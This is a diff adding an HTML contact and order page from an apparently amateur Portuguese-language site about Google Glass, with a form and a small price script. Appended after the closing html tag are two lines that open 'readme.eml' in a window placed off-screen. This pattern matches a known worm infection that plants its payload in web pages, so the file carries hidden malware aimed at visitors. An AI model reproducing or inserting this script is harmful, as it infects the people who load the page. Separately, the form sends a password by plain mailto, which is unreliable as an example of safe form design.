@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang = "pt-pt">
+<head>
+   <meta charset="UTF-8"/>
+   <title>Tudo sobre Google Glass</title>
+   <link rel="stylesheet"  href="_css/estilo.css"/> <!--type="text/css" eh opcional*/-->
+   <link rel="stylesheet" href="_css/form.css"/>
+   <script language = "javascript" src = "_javascript/funcoes.js"></script>
+	<script>
+		function calcTotal(){
+			var qnt = parseInt(document.getElementById('cQnt').value);
+			tot = qnt*1500;
+			if(tot >= 0){
+				document.getElementById('cTot').value = tot;
+			}else{
+				document.getElementById('cTot').value = " ";
+			}
+			
+		}
+	</script>  
+</head>
+
+<body>
+<div id="interface">
+  <header id = "cabecalho">
+     <hgroup>
+     <h1>Google Glass</h1>
+     <h2>A revolução do Google está chegando</h2>
+     </hgroup>
+     <img id="icone" src="_imagens/contato.png">
+ 
+ <nav id="menu">
+	<h1>Menu Principal</h1>
+	<ul type="disc">
+	   <li onmouseover = "mudaFoto('_imagens/home.png')" onmouseout="mudaFoto('_imagens/contato.png')"><a href="index.html">Home</a></li>
+	   <li onmouseover = "mudaFoto('_imagens/especificacoes.png')" onmouseout="mudaFoto('_imagens/contato.png')"><a href="specs.html">Especificações</a></li>
+	   <li onmouseover = "mudaFoto('_imagens/fotos.png')" onmouseout="mudaFoto('_imagens/contato.png')"><a href="fotos.html">Fotos</a></li>
+	   <li onmouseover = "mudaFoto('_imagens/multimidia.png')" onmouseout="mudaFoto('_imagens/contato.png')"><a href="multimidia.html">Multimídia</a></li>
+	   <li onmouseover = "mudaFoto('_imagens/contato.png')" onmouseout="mudaFoto('_imagens/contato.png')"><a href="fale-conosco.html">Fale conosco</a></li>
+	</ul>
+ </nav>
+ </header>
+<section>
+	<article id="noticia-principal">
+	<header id="cabecalho-artigo"> 
+	<hgroup>
+	<h3>Fale Conosco > Contato</h3>
+	<h1>Formulário de Contato</h1>
+	<h2>por António Himoth</h2>
+	<h3 class="direita">Atualizado em 02/Abril/2022</h3>
+	</hgroup>
+	</header>
+
+	<form method="post" id="fContato" action="mailto:ahimoth@isced.ac.mz">	
+		<fieldset id="usuario">
+			<legend>Identificação do Usuário</legend>
+				<p><label for="cNome">Nome:</label> <input type="text" name="tNome" id="cNome" size="20" maxlength="30" placeholder="nome completo"/></p>
+				<p><label for="cSenha">Senha:</label> <input type="password" name="tSenha" id="cSenha" size="8" maxlength="8" placeholder="8 digitos"/></p>
+				<p><label for="cEmail">E-mail:</label> <input type="email" name="tEmail" id="cEmail" size="30" maxlength="40" placeholder="fulano@servidor.com"/></p>
+				<fieldset id="sexo"><legend>Sexo:</legend>
+					<input type="radio" name="tSexo" id="cMasc" checked/><label for="cMasc">Masculino</label>
+					<input type="radio" name="tSexo" id="cFem"/><label for="cFem">Feminino</label>
+				</fieldset>
+				<p><label for="cNasc">Data de Nascimento:</label> <input type="date" name="tNasc" id="cNasc"/></p>
+				
+		</fieldset>
+		<fieldset id="endereco">	
+			<legend >Endereço do Usuário</legend>
+				<p><label for="cLograd">Logradouro:</label> <input type="text" name="tLograd" id="cLograd" size="40" maxlength="80" placeholder="Rua, Av., Travessa"/></p>
+				<p><label for="cNum">Número:</label> <input type="number" name="tNum" id="cNum" size="5" maxlength="5" min="0" max="99999"/></p>
+				<p><label for="cEst">Província:</label>
+				   <select>
+						<optgroup label="Região Sul">
+							<option value="MC" selected>Maputo Cidade</option>
+							<option value="MP">Maputo Província</option>
+							<option value="GZ">Gaza</option>
+							<option value="IB">Inhambane</option>
+						</optgroup>
+						<optgroup label="Região Centro">
+							<option value="SA">Sofala</option>
+							<option value="MA">Manica</option>
+							<option value="ZB">Zambézia</option>	
+							<option value="TE">Tete</option>
+						</optgroup>
+						<optgroup label="Região Norte">
+							<option value="NPL">Nampula</option>
+							<option value="CD">Cabo Delgado</option>
+							<option value="NS">Niassa</option>
+						</optgroup>
+				   </select>
+				</p>
+				<p><label for="cCidade">Cidade:</label> <input type="text" name="tCidade" id="cCidade" size="20" maxlength="40" placeholder="Sua cidade"list="cidades"/></p>
+				<datalist id="cidades">
+					<option value="Pemba"/>
+					<option value="Lichinga"/>
+					<option value="Nampula"/>
+					<option value="Quelimane"/>
+				</datalist>
+		</fieldset>
+		<fieldset id="msg">
+			<legend>Mensagem do Usuário</legend>
+				<p><label for="cUrg">Grau de Urgência:</label> Min.<input type="range" name="tUrg" id="cUrg" min="0" max="10" step="5"/>Max.</p>
+				<p><label for="cMsg">Mensagem: </label> <textarea name="tMsg" id="cMsg" cols="45" rows="5" placeholder="Deixe aqui a sua mensagem"></textarea></p>
+		</fieldset>
+		<fieldset id="pedido">
+			<legend>Quero um Google Glass</legend>
+				<p><input type="checkbox"name="tPedido" id="cPedido" checked/>
+				<label for="cPedido">Gostaria de adquirir um Google Glass quando disponível</label> </p>
+				<p><label for="cCor">Cor:</label> <input type="color" name="tCor" id="cCor" value="#0000FF"/></p>
+				<p><label for="cQnt">Quantidade: </label> <input type="number" name="tQnt" id="cQnt" size="8" min="0" max="5"value="0" oninput="calcTotal();"/></p>
+				<p><label for="cTot">Preço Total: R$</label> <input type="text" name="tTot" id="cTot" size="8" readonly placeholder="Total a pagar"/></p>
+		</fieldset>
+			<input id="botao" type="image" name="tEnviar" src="_imagens/botao-enviar.png"/>
+	</form>
+	</article>
+</section>
+
+
+<footer id="rodape">
+<p>Copyright &copy; 2022 - by António Himoth<br/>
+<a href="http://facebook.com/" target="_blank">Facebook </a>| 
+<a href="http://twitter.com/" target="_blank">Twitter</a></p>
+</footer>
+</div>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
